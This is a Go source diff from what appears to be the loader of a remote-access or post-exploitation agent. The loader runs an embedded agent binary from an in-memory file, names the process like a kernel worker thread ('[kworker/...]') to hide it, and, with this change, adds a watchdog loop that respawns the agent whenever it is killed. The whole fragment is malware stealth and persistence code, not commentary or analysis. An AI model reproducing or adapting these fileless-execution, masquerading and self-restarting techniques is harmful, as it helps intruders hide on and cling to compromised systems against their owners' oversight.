@@ -49,8 +49,6 @@ func main() {
 	if fd < 0 {
 		log.Print("MemFDWrite failed")
 	}
-	os.Setenv("FD", fmt.Sprintf("%d", fd))
-
 	// extract config JSON
 	// set env so that agent can read config from it
 	config_data, err := util.DigEmbeddedData(extracted_agent_elf.Bytes())
@@ -58,9 +56,24 @@ func main() {
 		log.Printf("Extract config data from agent ELF: %v", err)
 		config_data = []byte("invalid_json_config")
 	}
-	os.Setenv("MOTD", fmt.Sprintf("%s", config_data))
+	env := []string{
+		"FD=" + fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd),
+		"MOTD=" + fmt.Sprintf("%s", config_data),
+	}
 
-	// run from memfd
-	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
-	util.MemfdExec(procName, extracted_agent_elf.Bytes())
+	for {
+		// run from memfd
+		procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
+		child := util.MemfdExec(procName, env, extracted_agent_elf.Bytes())
+
+		for {
+			util.TakeASnap()
+
+			// guard child
+			if !util.IsPIDAlive(child) {
+				break
+			}
+		}
+		log.Printf("%d died, restarting", child)
+	}
 }
